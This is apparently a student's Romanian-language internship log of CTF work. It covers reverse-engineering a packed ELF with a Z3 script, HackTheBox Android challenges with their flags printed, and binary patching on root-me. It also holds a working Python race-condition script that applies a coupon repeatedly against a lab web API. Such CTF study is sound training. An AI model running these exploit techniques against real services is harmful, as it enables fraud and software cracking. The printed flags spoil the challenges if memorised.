# Practica2022



# ZIua 1 (14.06.2022)
Am vorbit despre ce ne am dori sa lucram la practica

# Ziua 2 (15.06.2022)
Am ales tema: Game Hacking , avand jocul Pwn Adventures ca model de lucru

am Urmarit diverse linkuri pe youtube ( Canalul lui LiveOverflow are o intreaga serie pe baza acestui joc)

# Ziua 3 (16.06.2022)

Am configurat serverul jocului pe linux folosind containere  [docker](https://liveoverflow.com/setup-private-server-with-docker-pwn-adventure-3-2/)
Am incercat sa configurez clientul pe linux insa, in urma unor pachete lipse si vechimea jocului , nu am reusit sa instalam clientul pe linux.

# Ziua 4(17.06.2022)
Am gasit o alternativa la problema de mai sus, instaland clientul pe windows si configurand in fisierele de sistem (etc/hosts .. ) adresele ip ale serverului.
UN walkthrough al jocului ne a permis o intelegere mai usoara a ceea ce se intampla , insa arhitectura era mult diferita de cea de pe linux .Prin urmare
am abandonat tema aceasta

# Ziua 5(18.06.2022)

Am inceput sa lucrez CTF-uri.
challenge 1 CYBERMAN RE2


avem un executabil elf pe 32 de biti
```
objdump -h secret
```

observam ca fisierul nu avea descris section header

```
strings secret
```

In urma comenzii observam ca executabilul este obfuscat cu utilitarul upx

instalam upx si deobfuscam executabilul

```
objdump -h secret
```

observam ca am restaurat contextul initial al fisierului.

Analizand functia main, observam ca programul ne cere sa trimitem 2 argumente care reprezinta credentialele aplicatiei.

![Main Executabil](/home/stefan/Pictures/Main.png)

avem de facut un patch la var_14 pentru a nu intra pe ramura cu ptrace_traceme,
observam ca exista o sectiune de assembly care este criptata. O putem decripta daca reusim sa descifram parolele trimise ca argument.
Functia check() ne permite sa analizam criteriile de autentificare.Prin urmare , realizam un script in python , folosindu-ne de framework ul Z3 si pwntools .

```
from z3 import *
from pwn import *

lenght = 15
str1 = ""
str2 = ""
arr1=[]
arr2=[]
data = [0x15E,0x142,0x13B,0x107,0x163,0x15A,0x149,0x131,0x12C,0x11B,0x143,0x122,0x13B,0x12F,0x135,0x166,0x142,0x16E,0x107,0x16E,0x113,0x149,0x131,0x12A,0x110,0x112,0x122,0x16C,0x175,0x137,0x16F,0x142,0x13D,0x158,0x132,0x114,0x149,0x163,0x12B,0x146,0x116,0x122,0x13C,0x174,0x161,0x13B,0x142,0x13E,0x106,0x167,0x114,0x149,0x16A,0x17F,0x111,0x116,0x122,0x16F,0x124,0x131,0x16D,0x142,0x16E,0x15D,0x136,0x143,0x149,0x161,0x12E,0x110,0x119,0x122,0x16A,0x122,0x164,0x168,0x142,0x13C,0x15C,0x131,0x11F,0x149,0x107,0x154,0x158,0x117,0x122,0x17C,0x137,0x124,0x11F,0x192,0x10C,0x13E,0x157,0x127,0x19A,0x152,0x119,0x123,0x121,0x1C3,0x1BC,0x1AC,0x14D,0x15E,0x12A,0x108,0x1F3,0x1D7,0x1A4,0x1E5,0x11F,0x128,0x1E3,0x1E2,0x14A,0x100]


def Function(string1 : bytes,string2 : bytes):
   p = process(["./secretPatched",string1,string2]).recvall()
   if p != b'It seems to be the corect credentials!\n':
      print(p)
      exit(1)

def Decrypt():
   for i in range(0x76):
      print(data[i]^arr1[i%0xf]^arr2[i%0xf],end=' ')
   print("\n\n")
   #for i in range(15):
   #   print(arr1[i]^arr2[i],end=' ')
   #print("")

solver = Solver()
string1 = [BitVec(f"string1[{i}]" ,8) for i in range(lenght)]
string2 = [BitVec(f"string2[{i}]" ,8) for i in range(lenght)]

solver.add(And(string2[0] + string1[0] == 0x85, string1[0] - string2[0] == 0x3))
solver.add(And(string1[1] | string2[1] == 0x7f, string1[1] - string2[1] == 0x3e ))
solver.add(And(string2[2] + string1[2] == 0xb2, string1[2] - string2[2] == 0x2a))
solver.add(And(string1[3] & string2[3] == 0x61, string1[3] - string2[3] == 0xf8))
solver.add(And(string1[4] & string2[4] == 0x40,  string1[4] - string2[4] == 0x1a))
solver.add(And(string1[5] & string2[5] == 0x20, string1[5] - string2[5] == 0x31))
solver.add(And(string1[6] | string2[6] == 0x67, string1[6] - string2[6] == 0xe1))
solver.add(And(string1[7] & string2[7] == 0x54,  string1[7] - string2[7] == 0x21))
solver.add(And(string1[8] | string2[8] == 0x73,  string1[8] - string2[8] == 0x33))
solver.add(And(string1[9] | string2[9] == 0x7b,  string1[9] - string2[9] == 0xf9))
solver.add(And(string2[10] + string1[10] == 0xc3, string1[10] - string2[10] == 0x23))
solver.add(And(string2[11] + string1[11] == 0xa1, string1[11] - string2[11] == 0xdf))
solver.add(And(string1[12] | string2[12] == 0x6b,  string1[12] - string2[12] == 0xba))
solver.add(And(string1[13] & string2[13] == 0x22,  string1[13] - string2[13] == 0xc5))
solver.add(And(string1[14] & string2[14] == 0x21,  string1[14] - string2[14] == 0xea))

while solver.check() == sat:
       solution = solver.model()
       for i in range(lenght):
          #str1 += hex(solution[string1[i]].as_long())[2:]
            arr1.append(solution[string1[i]].as_long())
            arr2.append(solution[string2[i]].as_long())
       Decrypt()
       arr1.clear()
       arr2.clear()
       #for i in range(lenght):
          #str2 += hex(solution[string2[i]].as_long())[2:]
       #print(str1," ",str2)
       #Function(bytes.fromhex(str1),bytes.fromhex(str2))
       #str1=""
       #str2=""


```

in cadrul scriptului am incercat mai multe metode de a gasi credentialele. Primul aproach a fost de a incerca un bruteforce , am generat credentialele si le am trimis ca argumente in cadrul programului secretPatched. Datorita duratei si lipsei de rabdare am modificat scriptul si am incercat sa iau codul assembly obfuscat si am generat mai multe parole care satisfaceau cerintele din check.Insa punam codul intr un desasamblor de assembly , nu am reusit sa identific vreun cod valid de assembly.. :(

# Ziua 7(21.06.2022)

Am lucrat niste challenge uri de pe platforma HTB de la categoria mobile.

Primul challenge

Primim un fisier .apk pe care l deschidem folosinf jadx-gui pe linux.

uitandu-ne in AndroidManifest.xml observam ca aplicatie incepe in com.awesomeProject.MainAPplication. In locatie observam definite mai multe metode. Fiind o aplicatie scrias in react-Native , trebuie sa analizam modulele de tip bundle. in fisierul ReactnativeHost observam ca sunt salvate modulele intr un singur fisier.Deschizand fisierul
observam o metoda (GetBundleAssetName) care ne trimite catre un fisier cu assets.
la Finalul fisierului observam un string codificat in base64 , care este i flagul challengelui SFRCezIzbTQxbl9jNDFtXzRuZF9kMG43XzB2MzIyMzRjN30=
HTB{23m41n_c41m_4nd_d0n7_0v32234c7}

Al doilea challenge : CAT

avem un fisier de tip .ab pe care l deschidem apeland urm comanda:
```
( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; tail -c +25 cat.ab ) |  tar xfvz -
```
[link comanda](https://stackoverflow.com/questions/18533567/how-to-extract-or-unpack-an-ab-file-android-backup-file?answertab=trending#tab-top)

ne creeaza directorul shared pe care l analizam.
avem un subfolder numit Photos pe care daca l parcurgem observam o poza cu flag ul HTB{ThisBackupIsUnprotected}

# Ziua 8(22.06.2022)

Continuam cu un nou challenge mai interesant de mobile.
ApKey.

Analizand fisierul in jadx observam ca fisierul are un sistem de logging.Trebuie sa verificam un input sa corespunda cu un hash de md5.
Modificam codul .smali cu apktool astfel incat sa schimbam hash ul in unul cunoscut si aflam flagul.


# Ziua 9(23.06.2022)

Rezolvam un challenge de web de e hackthebox

APLICATIa este un vending machine care ne permite cumpararea unor produse in limita cash ului generat de catre un cupon HTB_100. Insa flagul este afisat daca putem cumpara un produs al carui pret depaseste cu mult cel generat de catre cupon.
Analizand fisierele aplicatiei observam ca aplicatia scrisa in nodejs are un comportament asincron(modul in care gestioneaza cererile).Prin urmare, vom realiza cereri de validare a cuponului pt a ne creste bankroll ul si a putea flagul.

![diogene s rage](/home/stefan/Pictures/Diogenes.png)

```

from threading import Thread,Barrier
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

threads=[]

URL = "http://157.245.46.136:32006/"
url = URL+"api/coupons/apply"

coupon = {"coupon_code": "HTB_100"}



url_pur = URL+"api/purchase"
item = {"item": "C8"}
r = requests.session()
s = r.post(url_pur, json=item)


def pwn():
    headers = {"Content-Type" : "application/json" }
    headers['Cookie'] = "session="+s.cookies.get_dict()['session']
    r = requests.post(url_pur, json=item,headers=headers)
    print(r.text)

def connect(barrier,URLs):
    headers = {"Content-Type" : "application/json" }
    headers['Cookie'] = "session="+s.cookies.get_dict()['session']
    #print(headers)
    r = requests.post(URLs, json=coupon,headers=headers)
    print(r.text)
    barrier.wait()

#with ThreadPoolExecutor(max_workers=8) as executor:
    #for x in range(1000):
        #executor.submit(connect, url)
    #executor.submit(pwn)
barrier = Barrier(16)
for _ in range(16):
    t = Thread(target=connect,args=(barrier, url))
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()
pwn()

```


# Ziua 10(24.06.2022)

Rezolvam un challenge de RE de pe root-me.

![ROOT_ME](/home/stefan/Pictures/ROOT-ME.png)

Observam ca programul primeste ca parametrul o parola.Aceasta este prelucrata si se verifica continutul acesteia in functia
care este apelata prin intermediul unui pointer la functie.Functia care este apelata este WPA , in interiorul careia se face o comparatie. Flagul este in functia blowfish(), prin urmare facem un patch care sa nu ne mai execute instructiunile de apel al functiei RS4.


![ROOT_ME](/home/stefan/Pictures/ROOT-ME2.png)

![ROOT_ME](/home/stefan/Pictures/ROOT-ME3.png)

flagul este afisat imediat dupa patch.

